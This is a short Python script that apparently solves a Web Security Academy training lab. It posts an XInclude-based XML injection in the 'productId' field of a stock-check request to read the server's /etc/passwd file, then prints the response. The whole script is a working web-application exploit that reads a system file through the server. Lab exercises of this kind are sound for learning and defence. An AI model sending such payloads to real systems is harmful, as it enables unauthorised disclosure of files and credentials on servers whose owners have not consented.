import requests

url = "https://0ac200e30405218880217169007300ab.web-security-academy.net/product/stock"

# Inject XML into productId field using XInclude
data = {
    "productId": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    "storeId": "1"
}

resp = requests.post(url, data=data)
print(resp.text)
